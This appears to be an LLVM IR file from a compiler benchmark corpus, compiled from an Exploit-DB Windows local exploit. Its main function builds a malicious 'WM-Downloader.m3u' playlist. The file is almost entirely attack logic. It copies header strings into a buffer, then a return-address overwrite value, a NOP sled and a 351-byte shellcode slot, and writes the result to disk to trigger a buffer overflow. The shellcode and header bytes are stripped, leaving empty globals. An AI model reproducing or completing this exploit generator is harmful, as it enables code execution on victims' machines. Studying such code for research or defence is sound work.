; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_8411.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_8411.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [18 x i8] c"WM-Downloader.m3u\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@header1 = common dso_local global i32* null, align 8
@header2 = common dso_local global i32* null, align 8
@OFFSET = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@scode = common dso_local global i32* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 1853709447, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = call i32* @fopen(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %6, i32** %2, align 8
  %7 = icmp eq i32* %6, null
  br i1 %7, label %8, label %11

8:                                                ; preds = %0
  %9 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %10 = call i32 @exit(i32 0) #3
  unreachable

11:                                               ; preds = %0
  %12 = load i32*, i32** @header1, align 8
  %13 = call i32 @strlen(i32* %12)
  %14 = load i32*, i32** @header2, align 8
  %15 = call i32 @strlen(i32* %14)
  %16 = add nsw i32 %13, %15
  %17 = load i32, i32* @OFFSET, align 4
  %18 = add nsw i32 %16, %17
  %19 = add nsw i32 %18, 4
  %20 = add nsw i32 %19, 10
  %21 = add nsw i32 %20, 351
  %22 = call i64 @malloc(i32 %21)
  %23 = inttoptr i64 %22 to i8*
  store i8* %23, i8** %3, align 8
  %24 = load i8*, i8** %3, align 8
  %25 = load i32*, i32** @header1, align 8
  %26 = call i32 @strlen(i32* %25)
  %27 = load i32*, i32** @header2, align 8
  %28 = call i32 @strlen(i32* %27)
  %29 = add nsw i32 %26, %28
  %30 = load i32, i32* @OFFSET, align 4
  %31 = add nsw i32 %29, %30
  %32 = add nsw i32 %31, 4
  %33 = add nsw i32 %32, 10
  %34 = add nsw i32 %33, 351
  %35 = call i32 @memset(i8* %24, i32 144, i32 %34)
  %36 = load i8*, i8** %3, align 8
  %37 = load i32*, i32** @header1, align 8
  %38 = load i32*, i32** @header1, align 8
  %39 = call i32 @strlen(i32* %38)
  %40 = call i32 @memcpy(i8* %36, i32* %37, i32 %39)
  %41 = load i8*, i8** %3, align 8
  %42 = load i32*, i32** @header1, align 8
  %43 = call i32 @strlen(i32* %42)
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i32*, i32** @header2, align 8
  %47 = load i32*, i32** @header2, align 8
  %48 = call i32 @strlen(i32* %47)
  %49 = call i32 @memcpy(i8* %45, i32* %46, i32 %48)
  %50 = load i32, i32* @OFFSET, align 4
  store i32 %50, i32* %5, align 4
  %51 = load i8*, i8** %3, align 8
  %52 = load i32*, i32** @header1, align 8
  %53 = call i32 @strlen(i32* %52)
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %51, i64 %54
  %56 = load i32*, i32** @header2, align 8
  %57 = call i32 @strlen(i32* %56)
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %55, i64 %58
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = call i32 @memcpy(i8* %62, i32* %4, i32 4)
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, 4
  store i32 %65, i32* %5, align 4
  %66 = load i8*, i8** %3, align 8
  %67 = load i32*, i32** @header1, align 8
  %68 = call i32 @strlen(i32* %67)
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i32*, i32** @header2, align 8
  %72 = call i32 @strlen(i32* %71)
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i32, i32* %5, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32*, i32** @nop, align 8
  %79 = call i32 @memcpy(i8* %77, i32* %78, i32 10)
  %80 = load i32, i32* %5, align 4
  %81 = add nsw i32 %80, 10
  store i32 %81, i32* %5, align 4
  %82 = load i8*, i8** %3, align 8
  %83 = load i32*, i32** @header1, align 8
  %84 = call i32 @strlen(i32* %83)
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %82, i64 %85
  %87 = load i32*, i32** @header2, align 8
  %88 = call i32 @strlen(i32* %87)
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = load i32, i32* %5, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = load i32*, i32** @scode, align 8
  %95 = call i32 @memcpy(i8* %93, i32* %94, i32 351)
  %96 = load i32, i32* %5, align 4
  %97 = add nsw i32 %96, 351
  store i32 %97, i32* %5, align 4
  %98 = load i8*, i8** %3, align 8
  %99 = load i32*, i32** %2, align 8
  %100 = call i32 @fputs(i8* %98, i32* %99)
  %101 = load i32*, i32** %2, align 8
  %102 = call i32 @fclose(i32* %101)
  %103 = load i8*, i8** %3, align 8
  %104 = call i32 @free(i8* %103)
  ret i32 0
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @fputs(i8*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
